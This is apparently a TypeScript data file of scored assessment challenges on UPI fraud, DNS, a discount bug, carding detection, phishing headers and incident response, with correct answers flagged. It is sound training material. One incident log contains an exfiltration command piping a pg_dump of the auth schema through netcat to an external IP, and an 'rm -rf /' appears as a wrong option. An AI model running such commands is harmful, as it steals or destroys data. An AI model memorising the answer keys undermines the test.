import { DiagnosticChallenge } from '../types/assessment';

export const DIAGNOSTIC_CHALLENGES: DiagnosticChallenge[] = [
  // Challenge 1: Financial Fraud / UPI
  {
    id: 'diag_1_upi_screenshot',
    index: 1,
    domainId: 'fraud_safety',
    competencyId: 'comp_upi_verification',
    competencyName: 'Independent Payment Verification',
    title: 'The ₹4,500 Marketplace Claim',
    scenario: 'A buyer on a second-hand marketplace arrives to pick up an item. They show you a phone screen displaying a ₹4,500 UPI transfer receipt marked "Payment Successful" with your UPI ID. However, your own bank app balance has not changed, and you have received no credit SMS from your bank. The buyer claims: "Server takes 30 minutes to update. Please hand over the item now or scan my QR to confirm receipt."',
    difficulty: 'beginner',
    estimatedMinutes: 2,
    evidence: [
      {
        id: 'ev_1_receipt',
        type: 'text',
        title: 'Buyer Provided Screenshot Data',
        content: `Status: SUCCESSFUL (Green Tick)
Amount: ₹4,500.00
Paid To: seller@okhdfcbank
Date: Today, 14:32 IST
Transaction Ref (UTR): 4098271 (Notice: Only 7 digits; standard Indian banking UTR is 12 digits)
Font: Misaligned font kerning near the amount label`
      },
      {
        id: 'ev_1_bank',
        type: 'table',
        title: 'Your Bank Statement (Checked at 14:35 IST)',
        content: `Opening Balance: ₹12,450.00
Last 3 Inward Transactions:
• Yesterday 18:20: +₹1,200.00 (UPI Ref 429184029182)
• Yesterday 11:15: +₹500.00 (UPI Ref 429177192019)
• 3 Days Ago: +₹2,000.00 (IMPS Ref 429011928374)
Pending Inward UPI Transfers: None logged.`
      }
    ],
    instructions: 'Evaluate the evidence and select the safest, most appropriate action to protect yourself from financial fraud.',
    options: [
      {
        id: 'opt_1_handover',
        label: 'Hand over the item immediately since the screenshot shows a green tick with your correct UPI ID.',
        isCorrect: false,
        isCriticalFailure: true,
        feedbackText: 'Critical Error: Screenshots and receipt screens are trivial to fake using template generator apps. Never release goods without verified credit in your own bank account.'
      },
      {
        id: 'opt_1_scan_qr',
        label: 'Scan the buyer’s QR code to "confirm receipt" and unlock the funds.',
        isCorrect: false,
        isCriticalFailure: true,
        feedbackText: 'Critical Error: Scanning a QR code or entering a UPI PIN transfers money OUT of your account. Receiving funds NEVER requires entering a PIN.'
      },
      {
        id: 'opt_1_verify_bank',
        label: 'Politely decline to release the item until your own bank passbook/app independently confirms the credit; refuse to scan any QR code or enter your PIN.',
        isCorrect: true,
        feedbackText: 'Excellent decision! Legitimate funds reflect immediately in your bank statement. Furthermore, the 7-digit UTR in the screenshot is an immediate red flag for fake receipt generators.'
      },
      {
        id: 'opt_1_share_otp',
        label: 'Ask the buyer to call customer care on speaker and share whatever verification OTP arrives on your phone.',
        isCorrect: false,
        isCriticalFailure: true,
        feedbackText: 'Dangerous: Never share any OTP or allow unverified third parties to broker transactions.'
      }
    ],
    explanationPrompt: 'Why is relying on a sender’s screenshot or scanning a QR code dangerous when receiving payments?',
    hints: [
      'Standard Indian banking UTR numbers are always 12 digits long.',
      'Receiving money via UPI never requires entering a UPI PIN or scanning a collect QR.'
    ],
    adaptiveBranchOnPassId: 'diag_1_adv_kyc',
    adaptiveBranchOnFailId: 'diag_1_base_pin'
  },

  // Challenge 2: Technical Reasoning / DNS
  {
    id: 'diag_2_dns_vs_ip',
    index: 2,
    domainId: 'it_networking',
    competencyId: 'comp_dns_troubleshooting',
    competencyName: 'DNS vs IP Layer Diagnostics',
    title: 'The Unreachable Internal Portal',
    scenario: 'An engineer reports that typing "https://portal.internal.corp" in their web browser fails with "ERR_NAME_NOT_RESOLVED". However, when they type "https://192.168.10.45" (the server’s direct IP address), the portal dashboard loads cleanly. Other public websites like "wikipedia.org" load without issue on the same machine.',
    difficulty: 'beginner',
    estimatedMinutes: 2,
    evidence: [
      {
        id: 'ev_2_terminal',
        type: 'network_output',
        title: 'Diagnostic Terminal Output',
        content: `$ ping 192.168.10.45
PING 192.168.10.45: 64 bytes from 192.168.10.45: icmp_seq=0 ttl=64 time=1.42 ms
--- 192.168.10.45 ping statistics: 1 packets transmitted, 1 received, 0% packet loss ---

$ nslookup portal.internal.corp
Server: 8.8.8.8
Address: 8.8.8.8#53
** server can't find portal.internal.corp: NXDOMAIN`
      },
      {
        id: 'ev_2_nic',
        type: 'text',
        title: 'Network Adapter Settings',
        content: `IPv4 Configuration: DHCP
Assigned DNS Servers: 8.8.8.8, 8.8.4.4 (Configured manually by user)
Internal Corporate DNS IP: 192.168.10.2 (Not present in adapter DNS list)`
      }
    ],
    instructions: 'Determine what is causing the failure and identify the exact root cause from the evidence.',
    options: [
      {
        id: 'opt_2_webserver_down',
        label: 'The web server on port 443 is stopped or firewalled.',
        isCorrect: false,
        feedbackText: 'Incorrect: The server loaded successfully when accessed via IP 192.168.10.45, proving the web service and port 443 are fully operational.'
      },
      {
        id: 'opt_2_public_dns_query',
        label: 'The host is querying public DNS (8.8.8.8) which has no record for internal private domains; the adapter needs the corporate DNS server (192.168.10.2).',
        isCorrect: true,
        feedbackText: 'Correct! Public DNS resolvers (8.8.8.8) cannot resolve private corporate zones. Setting the corporate internal DNS server resolves NXDOMAIN.'
      },
      {
        id: 'opt_2_gateway_down',
        label: 'The default gateway is dropping ARP packets across the local subnet.',
        isCorrect: false,
        feedbackText: 'Incorrect: Direct IP ping and public internet browsing work normally, proving the local link and gateway are operating.'
      },
      {
        id: 'opt_2_browser_cache',
        label: 'The browser TLS certificate store is corrupted and requires reinstallation.',
        isCorrect: false,
        feedbackText: 'Incorrect: The error is ERR_NAME_NOT_RESOLVED (DNS lookup failure), not a TLS/SSL certificate mismatch.'
      }
    ],
    explanationPrompt: 'Explain how the nslookup output pinpointed the exact issue.',
    hints: [
      'Look at which server answered the nslookup query: Server 8.8.8.8 is Google Public DNS.',
      'Can Google Public DNS know about internal private `.internal.corp` machines?'
    ]
  },

  // Challenge 3: Software Development / Bug Logic
  {
    id: 'diag_3_cart_discount_bug',
    index: 3,
    domainId: 'software_dev',
    competencyId: 'comp_code_debugging',
    competencyName: 'Root Cause Code Debugging',
    title: 'The Negative Balance Checkout Defect',
    scenario: 'Customers checking out on an e-commerce platform report an erratic bug: applying a "WELCOME20" coupon (20% off with maximum discount cap of ₹500) sometimes results in the total bill being higher than the original subtotal, or producing negative values when order subtotals are below ₹100.',
    difficulty: 'intermediate',
    estimatedMinutes: 2,
    evidence: [
      {
        id: 'ev_3_code',
        type: 'code',
        title: 'Production Function: calculateFinalTotal.ts',
        content: `export function calculateFinalTotal(subtotal: number, couponCode?: string): number {
  let discountAmount = 0;
  
  if (couponCode === 'WELCOME20') {
    // 20% discount capped at ₹500
    const calculatedDiscount = subtotal * 0.20;
    // BUG HERE: Math.min used inverted logic with fixed coupon deduction
    discountAmount = Math.max(500, calculatedDiscount); 
  }
  
  const tax = subtotal * 0.18; // 18% GST
  const finalTotal = subtotal - discountAmount + tax;
  
  return finalTotal;
}`
      }
    ],
    instructions: 'Identify the flaw in the logic and specify the correct fix.',
    options: [
      {
        id: 'opt_3_tax_calculation',
        label: 'The 18% tax calculation is using the wrong multiplier and should be divided by 100.',
        isCorrect: false,
        feedbackText: 'Incorrect: `subtotal * 0.18` correctly represents 18% tax.'
      },
      {
        id: 'opt_3_min_max_inverted',
        label: '`Math.max(500, calculatedDiscount)` guarantees a minimum deduction of ₹500 even if the subtotal is only ₹100. It must be `Math.min(500, calculatedDiscount)`.',
        isCorrect: true,
        feedbackText: 'Spot on! Using Math.max ensured at least ₹500 was subtracted regardless of cart size, causing small carts to drop below zero or exceed expected discounts.'
      },
      {
        id: 'opt_3_string_equality',
        label: 'Strict equality `===` fails on string comparison in TypeScript.',
        isCorrect: false,
        feedbackText: 'Incorrect: `===` is standard, idiomatically correct string comparison in TypeScript and JavaScript.'
      },
      {
        id: 'opt_3_floating_point',
        label: 'The function fails because JavaScript numbers cannot represent decimals.',
        isCorrect: false,
        feedbackText: 'Incorrect: While IEEE-754 floating point requires cent rounding in production, the catastrophic logic bug here is Math.max vs Math.min.'
      }
    ],
    explanationPrompt: 'Why is Math.min appropriate when implementing a discount ceiling (cap)?',
    hints: [
      'A "cap" means the discount should never exceed ₹500.',
      'What happens in `Math.max(500, 20)` when subtotal is ₹100 (20% = 20)?'
    ]
  },

  // Challenge 4: Data & AI / Anomaly Discrimination
  {
    id: 'diag_4_data_anomaly',
    index: 4,
    domainId: 'data_ai',
    competencyId: 'comp_anomaly_detection',
    competencyName: 'Statistical Anomaly Discrimination',
    title: 'The 3:00 AM Midnight Transaction Surge',
    scenario: 'Your analytics dashboard triggers an alert: between 02:45 and 03:15 AM, payment transaction volume jumped from a baseline average of 12 requests/minute to 480 requests/minute. The marketing department claims: "We launched a midnight flash sale campaign." You must analyze the sample telemetry to determine whether this is authentic organic customer demand or an automated carding/credential attack.',
    difficulty: 'intermediate',
    estimatedMinutes: 2,
    evidence: [
      {
        id: 'ev_4_table',
        type: 'table',
        title: 'Telemetry Sample (50 Records Window)',
        content: `Timestamp | Amount | Payment Status | User Agent | Delivery Postal Code | Unique IP Count
02:50:01  | ₹1.00  | 51_DECLINED    | Python-urllib/3.9 | 110001               | 48 unique IPs in /24
02:50:04  | ₹1.00  | 51_DECLINED    | Python-urllib/3.9 | 110001               | 48 unique IPs in /24
02:50:07  | ₹1.00  | 00_SUCCESS     | Python-urllib/3.9 | 110001               | 48 unique IPs in /24
02:50:09  | ₹1.00  | 51_DECLINED    | Python-urllib/3.9 | 110001               | 48 unique IPs in /24
Marketing Flash Sale Terms: Minimum order ₹299; targeted pan-India mobile users via Instagram App.`
      }
    ],
    instructions: 'Evaluate the evidence to formulate the correct finding and immediate recommendation.',
    options: [
      {
        id: 'opt_4_flash_sale_normal',
        label: 'Confirm the marketing team’s statement: this is organic traffic from the flash sale and servers should scale up to handle the load.',
        isCorrect: false,
        isCriticalFailure: true,
        feedbackText: 'Dangerous: Genuine shoppers during an Instagram flash sale do not buy items for ₹1.00 with Python-urllib user agents from an identical postal code with 90% card declines!'
      },
      {
        id: 'opt_4_carding_attack',
        label: 'Identify as an automated Card Testing / Carding attack (testing stolen card lists with ₹1 auths using a Python bot script); block the offending subnet and enforce rate-limiting with CAPTCHA.',
        isCorrect: true,
        feedbackText: 'Excellent analytical reasoning! The repetitive ₹1 micro-transactions, Python user agent, high decline rate, and concentrated postal code are classic hallmarks of automated card validation botnets.'
      },
      {
        id: 'opt_4_database_index',
        label: 'This is a database connection leak caused by missing SQL indexes on the postal code column.',
        isCorrect: false,
        feedbackText: 'Incorrect: The incoming HTTP traffic characteristics clearly demonstrate malicious bot intent, not a database index issue.'
      },
      {
        id: 'opt_4_random_glitch',
        label: 'Ignore the alert as random statistical noise that will self-correct by morning.',
        isCorrect: false,
        feedbackText: 'Incorrect: A 4000% surge with 90%+ bank declines exposes the merchant to catastrophic payment processor fines and fraud chargebacks.'
      }
    ],
    explanationPrompt: 'What key signals distinguished this traffic from legitimate marketing shoppers?',
    hints: [
      'Look at the transaction amounts (₹1.00 vs ₹299 promotion minimum).',
      'Look at the User Agent string: "Python-urllib/3.9".'
    ]
  },

  // Challenge 5: Cybersecurity / Phishing Investigation
  {
    id: 'diag_5_phishing_headers',
    index: 5,
    domainId: 'cybersecurity',
    competencyId: 'comp_phishing_investigation',
    competencyName: 'Email & Domain Phishing Analysis',
    title: 'The Critical IT Password Reset Notice',
    scenario: 'An employee forwards an urgent email they received this morning with the subject "URGENT: Mandatory Password Expiration within 2 hours". The email displays the internal IT helpdesk logo and contains a button labelled "Verify Credentials Now". Before advising the company, you examine the raw RFC 822 email headers.',
    difficulty: 'intermediate',
    estimatedMinutes: 2,
    evidence: [
      {
        id: 'ev_5_headers',
        type: 'email_header',
        title: 'Raw Email Headers',
        content: `From: "IT Support Desk" <helpdesk@acme-corp.com>
Reply-To: security-verify@acme-c0rp.support
Return-Path: bounce@relay-771.external-mail-sender.net
Received-SPF: SoftFail (domain of acme-corp.com does not designate 198.51.100.22 as permitted sender)
Authentication-Results: spf=softfail; dkim=neutral (no key for signature);
X-Target-URL: https://acme-c0rp.support/login?token=x8921a`
      }
    ],
    instructions: 'Analyze the headers and determine the authenticity and proper action.',
    options: [
      {
        id: 'opt_5_legitimate',
        label: 'The email is legitimate because the From header clearly says "helpdesk@acme-corp.com". Advise users to click and reset passwords.',
        isCorrect: false,
        isCriticalFailure: true,
        feedbackText: 'Critical Error: The "From" display header is easily spoofed by attackers. Never trust the display header alone without verifying SPF/DKIM and Return-Path.'
      },
      {
        id: 'opt_5_spoofed_phish',
        label: 'This is a spear-phishing attack. The SPF failed, the Return-Path is an external relay, the link uses typosquatting ("acme-c0rp.support" with a zero), and Reply-To redirects to an attacker-controlled mailbox.',
        isCorrect: true,
        feedbackText: 'Outstanding forensic deduction! You caught the spoofed From header, the SPF SoftFail, the lookalike domain (zero instead of o: c0rp), and credential-harvesting parameters.'
      },
      {
        id: 'opt_5_forward_all',
        label: 'Forward the email to all employees so everyone can test if the link works on their machines.',
        isCorrect: false,
        isCriticalFailure: true,
        feedbackText: 'Dangerous: Forwarding malicious phishing links across the organisation risks widespread credential compromise.'
      },
      {
        id: 'opt_5_change_router',
        label: 'Reboot the local Wi-Fi router to clear cached DNS spoofing.',
        isCorrect: false,
        feedbackText: 'Incorrect: The email arrived via external SMTP relay with spoofed headers; local Wi-Fi router reboot does not address SMTP phishing.'
      }
    ],
    explanationPrompt: 'Identify at least two distinct header indicators that proved this email was forged.',
    hints: [
      'Look closely at the domain name in the Reply-To and X-Target-URL headers: is it `corp` or `c0rp`?',
      'Check the Received-SPF line.'
    ]
  },

  // Challenge 6: Cybersecurity & Incident Triage
  {
    id: 'diag_6_incident_containment',
    index: 6,
    domainId: 'cybersecurity',
    competencyId: 'comp_incident_containment',
    competencyName: 'Incident Prioritization & Containment',
    title: 'Active Production Endpoint Compromise',
    scenario: 'During your evening shift, the EDR (Endpoint Detection & Response) system sounds an alert on the primary customer database host `prod-db-01`. You observe an active interactive reverse shell connected to an IP in an unfamiliar foreign jurisdiction. The attacker process is attempting to dump customer credential hashes.',
    difficulty: 'advanced',
    estimatedMinutes: 2,
    evidence: [
      {
        id: 'ev_6_process',
        type: 'log_entry',
        title: 'Active Process Tree & Socket Table',
        content: `PID 1420 (postgres) -> fork PID 8912 (/bin/sh -i)
PID 8912 (/bin/sh -i) -> TCP ESTABLISHED 10.0.4.15:44321 -> 203.0.113.88:4444
Active command running: pg_dump -U postgres --schema=auth | gzip | nc 203.0.113.88 4444
Memory: 64 GB active RAM containing encryption keys and transient memory state`
      }
    ],
    instructions: 'Choose the most effective immediate containment action that halts data exfiltration while protecting evidence.',
    options: [
      {
        id: 'opt_6_pull_power',
        label: 'Immediately yank the power cable or trigger a hard server reboot.',
        isCorrect: false,
        feedbackText: 'Suboptimal: A hard power-off destroys all volatile RAM evidence, unencrypted keys, active process trees, and memory artifacts essential for forensics.'
      },
      {
        id: 'opt_6_isolate_network',
        label: 'Isolate the host at the network layer (drop outgoing firewall rules or place in quarantined VLAN) immediately killing the exfiltration socket, preserve volatile memory for forensics, and revoke exposed DB credentials.',
        isCorrect: true,
        feedbackText: 'Professional incident response! Network isolation instantly stops ongoing data exfiltration without erasing critical volatile RAM memory necessary for root cause analysis.'
      },
      {
        id: 'opt_6_email_attacker',
        label: 'Send an email to the external IP owner asking them to cease the attack.',
        isCorrect: false,
        feedbackText: 'Ineffective and dangerous: Active attackers do not halt automated data theft in response to polite inquiries.'
      },
      {
        id: 'opt_6_wipe_disk',
        label: 'Run rm -rf / to destroy the database before the attacker can download it.',
        isCorrect: false,
        isCriticalFailure: true,
        feedbackText: 'Catastrophic: Destroying your own production data causes permanent self-inflicted business devastation and destroys all evidence.'
      }
    ],
    explanationPrompt: 'Why is network isolation superior to an immediate hard reboot during active compromise?',
    hints: [
      'What happens to information stored in RAM (volatile memory) when a computer is powered off?',
      'How does network isolation stop exfiltration immediately?'
    ]
  }
];

// Adaptive Branching Tasks (injected dynamically when users fail or excel in diagnostic)
export const ADAPTIVE_BRANCH_TASKS: Record<string, DiagnosticChallenge> = {
  diag_1_base_pin: {
    id: 'diag_1_base_pin',
    index: 101,
    domainId: 'fraud_safety',
    competencyId: 'comp_qr_safety',
    competencyName: 'QR Code & Collect Request Safety',
    title: 'Foundational Safety: The UPI PIN Rule',
    scenario: 'A caller claiming to be a customer care representative says: "Your cashback of ₹2,000 has been approved. To credit this to your Google Pay / PhonePe account, enter your 6-digit UPI PIN on the screen prompt now."',
    difficulty: 'beginner',
    estimatedMinutes: 1,
    isFoundationalBranch: true,
    evidence: [
      {
        id: 'ev_pin_rule',
        type: 'text',
        title: 'Official NPCI & RBI Consumer Protection Rule',
        content: 'UPI PIN is REQUIRED ONLY when you are SENDING money from your account. Receiving money NEVER requires entering your UPI PIN, scanning a QR code, or sharing an OTP.'
      }
    ],
    instructions: 'What must you do when asked to enter a PIN to "receive" money?',
    options: [
      {
        id: 'opt_base_refuse',
        label: 'Refuse immediately and hang up; entering a PIN will debit ₹2,000 from your account instead of crediting it.',
        isCorrect: true,
        feedbackText: 'Correct! You have now reinforced the core rule: Entering a PIN always authorizes money leaving your account.'
      },
      {
        id: 'opt_base_enter_pin',
        label: 'Enter the PIN quickly before the offer expires.',
        isCorrect: false,
        isCriticalFailure: true,
        feedbackText: 'Fatal Error: Entering your PIN instantly deducts ₹2,000 from your balance.'
      }
    ],
    hints: ['Remember: PIN = Pay. No PIN is ever needed to receive.']
  },
  diag_1_adv_kyc: {
    id: 'diag_1_adv_kyc',
    index: 102,
    domainId: 'fraud_safety',
    competencyId: 'comp_kyc_fraud_awareness',
    competencyName: 'KYC & Impersonation Defense',
    title: 'Advanced Forensic: The Bank Deactivation SMS',
    scenario: 'You receive an SMS: "Dear Customer, Your HDFC NetBanking is blocked due to pending PAN KYC. Download QuickSupport APK at hdfc-secure-kyc.in to prevent account closure within 24 hours."',
    difficulty: 'intermediate',
    estimatedMinutes: 2,
    isAdvancedBranch: true,
    evidence: [
      {
        id: 'ev_adv_sms',
        type: 'text',
        title: 'SMS Details',
        content: `Sender: +91-98210-XXXXX (Standard personal mobile number, not official banking 6-character header like VK-HDFCBK)
Link: hdfc-secure-kyc.in (Unregistered lookalike domain)
Requested App: QuickSupport (Remote desktop control software that broadcasts phone screens)`
      }
    ],
    instructions: 'Identify the exact attack technique and appropriate response.',
    options: [
      {
        id: 'opt_adv_remote_app',
        label: 'This is a remote-access Trojan scam. The attacker uses a personal phone number, fake domain, and asks for QuickSupport to gain full screen-viewing control over your phone and steal OTPs.',
        isCorrect: true,
        feedbackText: 'Exceptional defense! You correctly identified the personal number header and remote desktop software trap.'
      },
      {
        id: 'opt_adv_download',
        label: 'Download the APK immediately since banks require updated PAN KYC annually.',
        isCorrect: false,
        isCriticalFailure: true,
        feedbackText: 'Severe risk: Banks never ask customers to download third-party remote screen-sharing tools via personal SMS.'
      }
    ],
    hints: ['Official bank SMS headers in India always use designated TRAI alpha codes like VK-HDFCBK or AD-SBIPAY.']
  }
};
